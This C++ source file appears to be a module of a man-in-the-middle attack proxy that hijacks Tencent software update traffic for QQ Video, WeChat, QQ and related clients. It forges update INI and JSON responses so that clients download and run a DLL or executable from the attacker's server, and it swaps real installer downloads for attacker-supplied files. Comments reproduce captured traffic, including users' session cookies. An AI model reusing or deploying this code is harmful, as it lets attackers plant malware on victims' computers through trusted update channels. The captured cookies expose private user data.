
#include <windows.h>
#include "QQVideoSSL.h"
#include "../cipher/CryptoUtils.h"
#include "../attack.h"
#include "sslPublic.h"
#include "../HttpUtils.h"
#include "PluginServer.h"

int gQQvideoType = 0;

//strstr(url,"/qqtv/bind/coexist.ini")
int QQVideoSSL::isQQVideo(const char * url, const char * host) {
	if (strstr(host, "dldir1.qq.com") && strstr(url, "/qqtv/qlpull/qlpull.ini"))
	{
		gQQvideoType = 1;
		return TRUE;

	}
	else if (strstr(host, "upmobile.v.qq.com") && strstr(url, "/?"))
	{
		gQQvideoType = 2;
		return TRUE;
	}

	return FALSE;
}

int QQVideoSSL::makeReponse(char * dstbuf,int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	if (gQQvideoType == 1)
	{
		int ret = FALSE;

		char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		char * retformat =
			"[General]\r\n"
			"SoftCount=1\r\n\r\n"
			"[Soft1]\r\n"
			"id=1000\r\n"
			"url=http://%s/%s\r\n"
			"funcname=RunFunc\r\n"
			"parameter=\r\n"	//9rd is larger than now verison of qq live?
			"localname=QLDZModule.dll\r\n";


		/*
		[General]
		SoftCount=1

		[Soft1]
		id=1000
		url=http://dldir1.qq.com/qqtv/qlpull/QLDZModule.dll
		funcname=RunFunc
		parameter=
		localname=QLDZModule.dll
		*/
		char result[1024];
		int retlen = wsprintfA(result, retformat, ip.c_str(), QQLIVEDLL_FILENAME);

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
	}else if (gQQvideoType == 2)
	{
		int ret = FALSE;

		char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		int version = 90190311; //50190311
		time_t unixtime = time(0);

		char * retformat =
			"{\"app_feature\":\"\\r\\n1、新增游戏中心频道，免费礼包领不停\\r\\n2、优化综艺选集浮层，观看往期内容更便捷\\r\\n3、优化热点短视频频道，更多精彩内容刷不停\","
			"\"app_version_desc\":\"腾讯视频 2030 10.17(90.19.3771.0)\",\"app_version_name\":\"%u\","
			"\"feature_pic\":[\"https://puui.qpic.cn/vupload/0/20190418_1555584559270_tu1070s9pir.png/0\","
			"\"https://puui.qpic.cn/vupload/0/20190418_1555584559256_cieefwyk0e.png/0\","
			"\"https://puui.qpic.cn/vupload/0/20190418_1555584559264_9yolw2gl4cm.png/0\","
			"\"https://puui.qpic.cn/vupload/0/20190418_1555584559265_iirkyclrjd.png/0\","
			"\"https://puui.qpic.cn/vupload/0/20190418_1555584559269_46eat4v68th.png/0\"],"
			"\"is_show\":\"1\",\"package_uri\":\"http://%s/%s\",\"prompt_interval\":2,"
			"\"unixtime\":\"%I64u\",\"update_type\":3,\"upgrade_state\":100}";

		char result[4096];
		int retlen = sprintf(result, retformat, version, ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, unixtime);

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
	}

	return 0;
}



int QQVideoSSL::isTencentPcUpgrade(const char * url,const char * host) {
	if (strstr(url, ".exe"))
	{
		if (strstr(url, "/qqtv/TencentVideoUpgrade") ||
			strstr(url, "/music/clntupate/") ||
			strstr(url, "/qqfile/qq/") ||
			strstr(url, "/qqfile/qq/plugin/")||
			strstr(url,"/P2PUpdate/P2PSetup.exe") ||
			strstr(url, "/weixin/Windows/WeChatSetup.exe") ||
			strstr(url, "/qqtv/qqlivesetup.exe") ||
			strstr(url, "/invc/"))
		{
			return TRUE;
		}
	}

	return FALSE;
}


/*
GET /wangwang/AliIM2018_taobao(9.12.03C).exe?spm=a220o.1000855.0.0.69bc3460cJhlgP&file=AliIM2018_taobao(9.12.03C).exe HTTP/1.1
Host: download.alicdn.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/octet-stream
Content-Length: 79437440
Connection: keep-alive
Date: Sat, 01 Jun 2019 12:30:12 GMT
x-oss-request-id: 5CF26FD360BDDFF84E111968
Accept-Ranges: bytes
ETag: "14F8EC468F82622A175D30FE8CF9CC1C"
Last-Modified: Mon, 12 Feb 2018 07:19:03 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 11230236931630712642
x-oss-storage-class: Standard
x-oss-meta-md5: 14f8ec468f82622a175d30fe8cf9cc1c
Cache-Control: max-age=86400
Content-MD5: FPjsRo+CYioXXTD+jPnMHA==
x-oss-server-time: 47
Via: cache24.l2eu6-1[0,304-0,H], cache5.l2eu6-1[1,0], cache1.cn1157[0,200-0,H], cache19.cn1157[1,0]
Ali-Swift-Global-Savetime: 1545913552
Age: 76037
X-Cache: HIT TCP_MEM_HIT dirn:13:799953991
X-Swift-SaveTime: Sat, 01 Jun 2019 12:55:02 GMT
X-Swift-CacheTime: 84910
Timing-Allow-Origin: *
EagleId: 755bb3db15594682489974544e




GET /weixin/Windows/WeChatSetup.exe HTTP/1.1
Cache-Control: no-cache
Connection: keep-alive
Cookie: pgv_pvi=663001088; ptui_loginuin=972823324; RK=VHSkZmJZQJ; ptcz=89b8eb873aebb2097467fa3dea63017f04963a05c33bf4ac209af247b33bbc41
Host: dldir1.qq.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36

HTTP/1.1 200 OK
Content-Length: 44094656
Last-Modified: Thu, 30 May 2019 12:10:59 GMT
Server: nws_4.2.1_midcache
Date: Thu, 30 May 2019 12:19:03 GMT
Cache-Control: max-age=600
Expires: Thu, 30 May 2019 12:29:03 GMT
Content-Type: application/octet-stream
X-NWS-LOG-UUID: 13758976160700283789
X-NWS-UUID-VERIFY: ad3a7bb09fb2caf066ba38c0297b79a5
Connection: keep-alive
X-Cache-Lookup: Cache Hit




GET /qqfile/qq/plugin/QzoneMusicInstall.exe HTTP/1.1
Host: dldir1.qq.com
Accept: *//*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Connection: Keep-Alive
Cache-Control: no-cache
Accept-Encoding: gzip, deflate

GET /qqtv/qqlivesetup.exe HTTP/1.1
Host: dldir1.qq.com
Accept: *//*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Connection: Keep-Alive
Cache-Control: no-cache
Accept-Encoding: gzip, deflate



GET /qqfile/qq/videomsg/VideoMsgInstall.exe HTTP/1.1
Host: dldir1.qq.com
Accept: *//*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Connection: Keep-Alive
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
*/


/*
GET /invc/tt/QQ/SEM/QQBrowser_Setup_QB10_10026011.exe HTTP/1.1
Host: dldir1.qq.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*//*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Referer: https://browser.qq.com/?adtag=SEM170314020
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: pgv_pvi=5939932160; RK=fGQ5OHDVS0; pac_uid=1_102290275; tvfe_boss_uuid=7a67d8dc78341a01; o_cookie=102290275; 
ptcz=307060c4e29118757cd809be513e9dfbf36701c23eea744f7404e34f20450489; pgv_info=ssid=s6947786260; pgv_pvid=8796446631; pgv_si=s773527552
*/



int QQVideoSSL::replyTencentPcUpgrade(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);

	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
	return 0;
}

int QQVideoSSL::replyTencentPcUpgrade(char*recvBuffer, int len, int buflimit, LPSSLPROXYPARAM pstSSLProxyParam) {
	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(pstSSLProxyParam->username, WEIXIN_PC_UPDATE_EXE_FILENAME);

	int ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
	return 0;
}

/*
GET /qqtv/qlpull/qlpull.ini HTTP/1.1
Accept: *//*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
Host: dldir1.qq.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: TCDN_NWS
Connection: keep-alive
Date: Tue, 29 May 2018 00:49:10 GMT
Cache-Control: max-age=600
Expires: Tue, 29 May 2018 00:59:10 GMT
Last-Modified: Thu, 29 Mar 2018 07:57:30 GMT
Content-Type: application/octet-stream
Content-Length: 156
X-NWS-LOG-UUID: 0cb2e20f-e676-4786-a3d9-c29ac22716fa 6751ae936f384cfbc621f7ed7531f191
X-Cache-Lookup: Hit From Disktank3

[General]
SoftCount=1

[Soft1]
id=1
url=http://dldir1.qq.com/qqtv/qlpull/wpsrp.dll
funcname=LaunchW
parameter=-vender=3rd_qqlive
localname=wpsrp.dll
*/

/*
GET /qqtv/qlpull/qlpull.ini HTTP/1.1
Accept: *//*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)
Host: dldir1.qq.com
Connection: Keep-Alive
Cookie: pgv_pvid=4403498724; o_cookie=2210853762; ptcz=04c7ccebe1803229ab09e06ce25d5595c0a964918d8e1b95771a60789179e292; pgv_pvi=359672832; pac_uid=1_2210853762; RK=TN7A2JS22v

HTTP/1.1 200 OK
Last-Modified: Wed, 18 Sep 2019 08:35:48 GMT
Server: nws_yybmid_hy
Date: Wed, 18 Sep 2019 08:42:32 GMT
Cache-Control: max-age=600
Expires: Wed, 18 Sep 2019 08:52:32 GMT
Content-Type: application/octet-stream
X-Daa-Tunnel: hop_count=1
Content-Length: 151
Accept-Ranges: bytes
X-NWS-LOG-UUID: 18321004850624912904
X-NWS-UUID-VERIFY: 13f6fabc650bc9e2eaabecd904f8508a
Connection: keep-alive
X-Cache-Lookup: Cache Hit

HTTP/1.1 200 OK
Last-Modified: Wed, 18 Sep 2019 08:35:48 GMT
Server: nws_yybmid_hy
Date: Wed, 18 Sep 2019 08:42:32 GMT
Cache-Control: max-age=600
Expires: Wed, 18 Sep 2019 08:52:32 GMT
Content-Type: application/octet-stream
X-Daa-Tunnel: hop_count=1
Content-Length: 151
Accept-Ranges: bytes
X-NWS-LOG-UUID: 18321004850624912904
X-NWS-UUID-VERIFY: 13f6fabc650bc9e2eaabecd904f8508a
Connection: keep-alive
X-Cache-Lookup: Cache Hit

[General]
SoftCount=1

[Soft1]
id=1000
url=http://dldir1.qq.com/qqtv/qlpull/QLDZModule.dll
funcname=RunFunc
parameter=
localname=QLDZModule.dll
*/

/*
GET /?os=1&platform=5&app_platform=29&app_version_name=50.18.0920 HTTP/1.1
Host: upmobile.v.qq.com:1864
Accept: *//*
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded

HTTP/1.1 200 OK
Content-Length: 840
Connection: close

{"app_feature":"\r\n1........................................................................\r\n\n
2............................................................\r\n\n3..........................................",
"app_version_desc":"............ 2018 10.16(10.16.3631.0)","app_version_name":"50190208",
"feature_pic":["https://puui.qpic.cn/vupload/0/20190315_1552621171456_qpzo4r3c2ke.png/0",
"https://puui.qpic.cn/vupload/0/20190315_1552621171461_99hqzr3spbc.png/0",
"https://puui.qpic.cn/vupload/0/20190315_1552621171465_45p3zsa18lv.png/0",
"https://puui.qpic.cn/vupload/0/20190315_1552621171469_7he4nsiobw3.png/0",
"https://puui.qpic.cn/vupload/0/20190315_1552621171470_0tyd0quwund.png/0"],
"is_show":"1","package_uri":"https://dldir1.qq.com/qqtv/TencentVideoUpgrade10.16.3631.0.exe",
"unixtime":"1554205717","update_type":1,"upgrade_state":100}
*/



/*
GET /?os=1&platform=5&app_platform=29&app_version_name=50.18.0920 HTTP/1.1
Host: upmobile.v.qq.com:1864
Accept: *//*
Accept - Encoding: gzip
Content - Type : application / x - www - form - urlencoded

HTTP / 1.1 200 OK
Content - Length : 827
Connection : close

{ "app_feature":"\r\n1、新增游戏中心频道，免费礼包领不停\r\n2、优化综艺选集浮层，观看往期内容更便捷\r\n3、优化热点短视频频道，更多精彩内容刷不停","app_version_desc" : "腾讯视频 2019 10.17(10.17.3771.0)","app_version_name" : "50190311","feature_pic" : ["https://puui.qpic.cn/vupload/0/20190418_1555584559270_tu1070s9pir.png/0","https://puui.qpic.cn/vupload/0/20190418_1555584559256_cieefwyk0e.png/0","https://puui.qpic.cn/vupload/0/20190418_1555584559264_9yolw2gl4cm.png/0","https://puui.qpic.cn/vupload/0/20190418_1555584559265_iirkyclrjd.png/0","https://puui.qpic.cn/vupload/0/20190418_1555584559269_46eat4v68th.png/0"],"is_show" : "1","package_uri" : "http://dldir1.qq.com/qqtv/TencentVideoUpgrade10.17.3771.0.exe","unixtime" : "1557401868","update_type" : 1,"upgrade_state" : 100 }

*/



/*
GET /commdatav2?cmd=57&dll_ver=1.3.66.358&dll_name=p2plive&guid=1676543296&platform=10204&t=1169193916 HTTP/1.1
Host: soup.v.qq.com
User-Agent: QQLive/1.3.66.358
Accept: *//*
Connection: close

HTTP/1.1 200 OK
Date: Mon, 09 Mar 2020 19:06:12 GMT
Content-Type: application/x-javascript; charset=utf-8
Content-Length: 71
Connection: close

QZOutputJson={"ret":0, "error_msg":"no record", "detail_msg":"no key"};
*/


